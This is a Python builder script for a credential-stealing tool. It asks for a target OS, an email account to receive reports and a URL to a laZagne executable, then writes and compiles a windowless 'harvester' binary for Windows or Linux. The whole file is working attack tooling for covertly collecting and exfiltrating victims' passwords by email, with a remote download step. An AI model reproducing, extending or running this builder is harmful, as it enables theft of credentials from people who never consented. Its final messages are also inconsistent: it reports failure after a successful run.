#!/usr/bin/env python3
# description="Harvest all credentials from target."
import inquirer
import subprocess
import os
from config.variables import WINDOWS_PYTHON_INTERPRETER_PATH

def write_harvester(file_name, email, password, url):
    with open(file_name, "w+") as file:
        file.write("import harvester\n")  
        file.write("harvester = harvester.Harvester('" + email + "','" + password + "','" + url + "')\n")
        file.write("harvester.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

def main():
    questions = [
        inquirer.List("operating_sys", message="Select the target OS", choices=[("Linux","linux"),("Windows","windows")] ),
        inquirer.Text("email", message="Enter email address to send reports to", validate=lambda _, x: x != ''),
        inquirer.Text("password", message="Enter password for given email address", validate=lambda _, x: x != ''),
        inquirer.Text("url", message="Enter absolute URL to laZagne .exe", validate=lambda _, x: x != ''),
        inquirer.Text("file_name", message="Enter output filename", validate=lambda _, x: x != '')
        ]
    answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)
    write_harvester(answers["file_name"], answers["email"], answers["password"], answers["url"])
    if (answers["operating_sys"] == "windows"):
        compile_for_windows(answers["file_name"])
    if (answers["operating_sys"] == "linux"):
        compile_for_linux(answers["file_name"])
    print("\n[+] Compilation complete.")
    print("[*] You must allow less secure applications in provided Gmail account.")
    print("[*] Do so here: https://myaccount.google.com/lesssecureapps")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[x] Compiler terminated by user")
    else:
        print("[-] Compilation failed")